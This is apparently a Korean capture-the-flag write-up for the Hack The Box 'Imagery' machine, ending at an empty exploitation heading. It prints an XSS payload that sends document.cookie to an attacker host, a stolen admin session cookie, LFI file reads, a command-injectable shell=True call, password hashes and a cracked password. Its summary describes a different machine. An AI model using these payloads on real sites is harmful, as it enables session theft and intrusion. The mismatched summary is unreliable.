---
title: "Imagery (Medium)"
date: 2025-12-09
layout: single
excerpt: "OnlyForYou는 중간 난이도 머신으로, 웹 애플리케이션에 존재하는 LFI(Local File Inclusion) 취약점을 통해 소스 코드를 열람할 수 있고, 이 코드에서 발견된 Blind Command Injection을 이용해 셸을 획득할 수 있다. 이후 머신 내부에서 실행 중인 여러 로컬 서비스 중 하나가 기본 자격 증명을 사용하고 있으며, 이 서비스의 특정 엔드포인트는 Cypher 인젝션에 취약하여 Neo4j 데이터베이스의 해시를 유출할 수 있고, 이 해시를 통해 SSH 접근 권한을 얻는다. 마지막으로, sudoers 파일이 잘못 구성되어 있어 pip3 download 명령을 루트 권한으로 실행할 수 있으며, 이를 이용해 Gogs에 호스팅된 악성 파이썬 패키지를 다운로드하고 실행함으로써 루트 권한을 탈취할 수 있다."
author_profile: true
toc: true
toc_label: "Imagery"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/imagery/imagery.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, lfi, command-injection, rce, neo4j, priv-esc, cypher-injection, gogs, pip-exploit, sudo, chisel, reverse-shell]
---

![Imagery](/assets/htb-linux/imagery/imagery.png)

# Enumeration

## Portscan

먼저 대상 Host(`10.129.2.56`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.2.56 | tee nmap
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 12:25 EST
Nmap scan report for 10.129.2.56
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
|_http-title: Image Gallery
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```

Nmap 스캔 결과, `SSH(22)`/`HTTP(8000)` 서비스가 열려 있다. `HTTP(8000)` 포트에서 접근 가능한 웹 애플리케이션이 존재함을 확인할 수 있다.

서버는 **Werkzeug 서버(`Version 3.1.3`, `Python 3.12.7`)**가 구동 중이다.

---

# Vulnerability Analysis

## Web Page Access

`8000` 번 포트에서 동작하는 웹 서버에 접속해보면, `Imagery` 라는 이름의 이미지 갤러리 웹 애플리케이션이 나타난다:

![Imagery](/assets/htb-linux/imagery/website.png)

계정을 생성하고 로그인에 성공하면, 아래와 같은 개인 이미지 갤러리 페이지가 나타난다:

![Imagery](/assets/htb-linux/imagery/login-success.png)

## XSS

사이트 하단의 `Quick Links` 영역을 살펴보면, **Report Bug** 라는 링크가 존재한다:

![Imagery](/assets/htb-linux/imagery/report-bug.png)

**Report Bug** 링크를 클릭하면, 사용자가 버그 내용을 제출할 수 있는 페이지로 이동된다.

해당 페이지는 두 개의 입력 필드(`Bug Name`, `Bug Details`)를 제공하고 있다:

![Imagery](/assets/htb-linux/imagery/report.png)

`Bug Details` 입력 칸에 다음과 같은 XSS 페이로드를 삽입하였다:

```html
<img src=1 onerror="new Image().src='http://10.10.14.76:8000/?c='+document.cookie">
```

페이로드를 제출한 뒤 로컬에서 간단한 `Python` HTTP 서버를 열어 두었다:

```bash
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

잠시 후, 관리자의 브라우저에서 해당 페이로드가 실행되면서 다음과 같이 세션 쿠키가 내 서버로 전송되는 것을 확인할 수 있었다:

```text
10.129.2.56 - - [09/Dec/2025 13:04:42] "GET /?c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aThkmQ.luDWp-jeNK6VXXtTI1VSTHviQSU HTTP/1.1" 200 -
```

이 쿠키 값을 브라우저 개발자 도구에 삽입한 뒤 페이지를 새로고침하면, 관리자 권한으로 **Admin Panel 대시보드** 에 접근할 수 있게 된다:

![Imagery](/assets/htb-linux/imagery/admin.png)

## LFI

`Admin Panel` 의 `User Management` 에서 각 사용자에 대해 **Download Log** 버튼이 존재한다.

이 버튼을 클릭하면, 아래와 같이 해당 사용자의 `.log` 파일이 다운로드된다:

![Imagery](/assets/htb-linux/imagery/download-log.png)

### Client Side Logic Analysis

`Admin Panel` 의 대시보드에서 브라우저의 `view-source` 기능을 통해 소스 코드를 확인한 결과, **Download Log 버튼과 연관된 다음과 같은 JavaScript 함수가 발견**되었다:

```js
function handleDownloadUserLog(username) {
    const logIdentifier = username;
    const logType = 'user';
    window.location.href = `/admin/get_system_log?log_identifier=${encodeURIComponent(logIdentifier)}.log`;
}
```

해당 코드는 사용자 이름을 기반으로 `.log` 파일을 지정하고, 다음과 같은 형식의 URL로 파일을 요청하는 구조이다.

이후 `Burp Suite` 를 킨 후, 위 함수의 경로로 `/etc/passwd` 요청을 전송한 결과 다음과 같이 **LFI 취약점**이 발견된 것을 확인할 수 있었다:

![Imagery](/assets/htb-linux/imagery/lfi.png)

### Source Code (Command Injection)

`/proc/self/cwd/api_edit.py` 경로를 통해 서버의 Python 소스 코드를 확인한 결과, 여러 이미지 관련 기능이 정의되어 있었으며, 이 중 **`apply_visual_transform()` 함수에서 취약점이 발견**되었다:

<details style="border: 1px solid #ccc; padding: 0.5em; border-radius: 5px;">  
    <summary style="font-weight: bold; cursor: pointer;">api_edit.py 코드는 다음과 같다:</summary>
    <br>
    <div markdown="1">

```python
from flask import Blueprint, request, jsonify, session
from config import *
import os
import uuid
import subprocess
from datetime import datetime
from utils import _load_data, _save_data, _hash_password, _log_event, _generate_display_id, _sanitize_input, get_file_mimetype, _calculate_file_md5

bp_edit = Blueprint('bp_edit', __name__)

@bp_edit.route('/apply_visual_transform', methods=['POST'])
def apply_visual_transform():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    transform_type = request_payload.get('transformType')
    params = request_payload.get('params', {})
    if not image_id or not transform_type:
        return jsonify({'success': False, 'message': 'Image ID and transform type are required.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to transform.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    if original_image.get('actual_mimetype') not in ALLOWED_TRANSFORM_MIME_TYPES:
        return jsonify({'success': False, 'message': f"Transformation not supported for '{original_image.get('actual_mimetype')}' files."}), 400
    original_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if original_ext not in ALLOWED_IMAGE_EXTENSIONS_FOR_TRANSFORM:
        return jsonify({'success': False, 'message': f"Transformation not supported for {original_ext.upper()} files."}), 400
    try:
        unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
        elif transform_type == 'rotate':
            degrees = str(params.get('degrees'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-rotate', degrees, output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'saturation':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,{float(value)*100},100", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'brightness':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"100,100,{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        elif transform_type == 'contrast':
            value = str(params.get('value'))
            command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, '-modulate', f"{float(value)*100},{float(value)*100},{float(value)*100}", output_filepath]
            subprocess.run(command, capture_output=True, text=True, check=True)
        else:
            return jsonify({'success': False, 'message': 'Unsupported transformation type.'}), 400
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Transformed: {original_image['title']}",
            'description': f"Transformed from {original_image['title']} ({transform_type}).",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Transformed',
            'type': 'transformed',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath)
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Transformed' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Transformed'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image transformed successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Image transformation failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during transformation: {str(e)}'}), 500

@bp_edit.route('/convert_image', methods=['POST'])
def convert_image():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    target_format = request_payload.get('targetFormat')
    if not image_id or not target_format:
        return jsonify({'success': False, 'message': 'Image ID and target format are required.'}), 400
    if target_format.lower() not in ALLOWED_MEDIA_EXTENSIONS:
        return jsonify({'success': False, 'message': 'Target format not allowed.'}), 400
    application_data = _load_data()
    original_image = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not original_image:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to convert.'}), 404
    original_filepath = os.path.join(UPLOAD_FOLDER, original_image['filename'])
    if not os.path.exists(original_filepath):
        return jsonify({'success': False, 'message': 'Original image file not found on server.'}), 404
    current_ext = original_image['filename'].rsplit('.', 1)[1].lower()
    if target_format.lower() == current_ext:
        return jsonify({'success': False, 'message': f'Image is already in {target_format.upper()} format.'}), 400
    try:
        unique_output_filename = f"converted_{uuid.uuid4()}.{target_format.lower()}"
        output_filename_in_db = os.path.join('admin', 'converted', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        command = [IMAGEMAGICK_CONVERT_PATH, original_filepath, output_filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        new_file_md5 = _calculate_file_md5(output_filepath)
        if new_file_md5 is None:
            os.remove(output_filepath)
            return jsonify({'success': False, 'message': 'Failed to calculate MD5 hash for new file.'}), 500
        for img_entry in application_data['images']:
            if img_entry.get('type') == 'converted' and img_entry.get('original_id') == original_image['id']:
                existing_converted_filepath = os.path.join(UPLOAD_FOLDER, img_entry['filename'])
                existing_file_md5 = img_entry.get('md5_hash')
                if existing_file_md5 is None:
                    existing_file_md5 = _calculate_file_md5(existing_converted_filepath)
                if existing_file_md5:
                    img_entry['md5_hash'] = existing_file_md5
                    _save_data(application_data)
                if existing_file_md5 == new_file_md5:
                    os.remove(output_filepath)
                    return jsonify({'success': False, 'message': 'An identical converted image already exists.'}), 409
        new_image_id = str(uuid.uuid4())
        new_image_entry = {
            'id': new_image_id,
            'filename': output_filename_in_db,
            'url': f'/uploads/{output_filename_in_db}',
            'title': f"Converted: {original_image['title']} to {target_format.upper()}",
            'description': f"Converted from {original_image['filename']} to {target_format.upper()}.",
            'timestamp': datetime.now().isoformat(),
            'uploadedBy': session['username'],
            'uploadedByDisplayId': session['displayId'],
            'group': 'Converted',
            'type': 'converted',
            'original_id': original_image['id'],
            'actual_mimetype': get_file_mimetype(output_filepath),
            'md5_hash': new_file_md5
        }
        application_data['images'].append(new_image_entry)
        if not any(coll['name'] == 'Converted' for coll in application_data.get('image_collections', [])):
            application_data.setdefault('image_collections', []).append({'name': 'Converted'})
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Image converted successfully!', 'newImageUrl': new_image_entry['url'], 'newImageId': new_image_id}), 200
    except subprocess.CalledProcessError as e:
        if os.path.exists(output_filepath):
            os.remove(output_filepath)
        return jsonify({'success': False, 'message': f'Image conversion failed: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during conversion: {str(e)}'}), 500

@bp_edit.route('/delete_image_metadata', methods=['POST'])
def delete_image_metadata():
    if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
    request_payload = request.get_json()
    image_id = request_payload.get('imageId')
    if not image_id:
        return jsonify({'success': False, 'message': 'Image ID is required.'}), 400
    application_data = _load_data()
    image_entry = next((img for img in application_data['images'] if img['id'] == image_id and img['uploadedBy'] == session['username']), None)
    if not image_entry:
        return jsonify({'success': False, 'message': 'Image not found or unauthorized to modify.'}), 404
    filepath = os.path.join(UPLOAD_FOLDER, image_entry['filename'])
    if not os.path.exists(filepath):
        return jsonify({'success': False, 'message': 'Image file not found on server.'}), 404
    try:
        command = [EXIFTOOL_PATH, '-all=', '-overwrite_original', filepath]
        subprocess.run(command, capture_output=True, text=True, check=True)
        _save_data(application_data)
        return jsonify({'success': True, 'message': 'Metadata deleted successfully from image!'}), 200
    except subprocess.CalledProcessError as e:
        return jsonify({'success': False, 'message': f'Failed to delete metadata: {e.stderr.strip()}'}), 500
    except Exception as e:
        return jsonify({'success': False, 'message': f'An unexpected error occurred during metadata deletion: {str(e)}'}), 500
```

</div>
</details>
<br>

해당 함수는 `testuser` 계정만 접근할 수 있도록 다음 조건을 통해 기능을 제한하고 있다:

```python
if not session.get('is_testuser_account'):
        return jsonify({'success': False, 'message': 'Feature is still in development.'}), 403
    if 'username' not in session:
        return jsonify({'success': False, 'message': 'Unauthorized. Please log in.'}), 401
```

즉, 세션 값 중 `testuser` 유저의 세션이 아니거나, 세션 자체가 존재하지 않을 경우, 해당 함수는 JSON 형태의 에러 메시지를 반환하게 된다.

그리고 클라이언트의 JSON 요청 본문에서 `imageId`, `transformType` 값을 추출하여 각각 `image_id`, `transform_type` 변수에 할당한다:

```python
request_payload = request.get_json()
image_id = request_payload.get('imageId')
transform_type = request_payload.get('transformType')
```

또한 `params` 라는 이름의 추가 파라미터도 함께 받아오며, 해당 값은 존재하지 않을 경우 기본값으로 빈 딕셔너리 `{}` 가 설정된다:

```python
params = request_payload.get('params', {})
```

`transform_type` 값이 `crop` 일 경우, 서버는 `params `로 전달된 `x`, `y`, `width`, `height` 값을 그대로 문자열로 변환하여 변수에 저장한 뒤, 이를 기반으로 ImageMagick 명령어를 구성한 후, `command` 변수에 저장한다.

하지만 `subprocess` 모듈을 통한 실행 명령어에선 **shell=True** 라는 옵션이 존재한다.

`x`, `y`, `width`, `height` 등 사용자 입력값이 명령어 문자열에 직접 포함될 경우, 셸 명령이 실행될 수 있는 **Command Injection** 취약점 발생이 가능해진다:

```python
unique_output_filename = f"transformed_{uuid.uuid4()}.{original_ext}"
        output_filename_in_db = os.path.join('admin', 'transformed', unique_output_filename)
        output_filepath = os.path.join(UPLOAD_FOLDER, output_filename_in_db)
        if transform_type == 'crop':
            x = str(params.get('x'))
            y = str(params.get('y'))
            width = str(params.get('width'))
            height = str(params.get('height'))
            command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

### Discovery of testuser Account

`/proc/self/cwd/utils.py` 경로에서 사용자 정보를 저장 및 로드하는 함수들을 확인할 수 있었다:

```python
import json
import os
import uuid
import hashlib
import mimetypes
import re
from datetime import datetime
from urllib.parse import unquote
import ipaddress
from config import *

# ...[SKIP]...

def _load_data():
    if not os.path.exists(DATA_STORE_PATH):
        return {'users': [], 'images': [], 'bug_reports': [], 'image_collections': []}
    with open(DATA_STORE_PATH, 'r') as f:
        data = json.load(f)
    for user in data.get('users', []):
        if 'isTestuser' not in user:
            user['isTestuser'] = False
    return data

def _save_data(data):
    with open(DATA_STORE_PATH, 'w') as f:
        json.dump(data, f, indent=4)

def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()

# ...[SKIP]...
```

`_save_data()` 함수는 `DATA_STORE_PATH` 경로에 위치한 JSON 파일에 사용자 정보를 포함한 데이터를 저장하는 함수이다.

또한, `_hash_password()` 함수에서는 사용자 비밀번호가 **MD5 해시 방식으로 암호화**되어 저장됨을 확인할 수 있다.

`DATA_STORE_PATH` 경로의 값을 확인하기 위해 `config.py` 소스코드를 분석해본 결과, 다음과 같은 정보를 얻을 수 있다:

```python
import os
import ipaddress

DATA_STORE_PATH = 'db.json'

# ...[SKIP]...
```

`db.json` 파일이 사용자 정보가 저장된 주요 데이터 저장소임을 알 수 있다.

이후 해당 파일의 내용을 분석한 결과, `/apply_visual_transform` 경로에 접근할 수 있는 **`testuser` 계정의 자격 증명 정보**가 포함되어 있는 것을 확인하였다:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        }
    ],
    "images": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ],
    "bug_reports": []
}
```

## Hashcrack

MD5 해시 방식으로 암호화된 `testuser` 의 비밀번호를 `hashcat` 을 사용해 ㄴ크랙한 결과, 다음과 같은 평문 비밀번호를 얻을 수 있었다:

```bash
$ hashcat -m 0 hash.txt --show /usr/share/wordlists/rockyou.txt

2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

---

# Exploitation

## Command Injection (RCE)











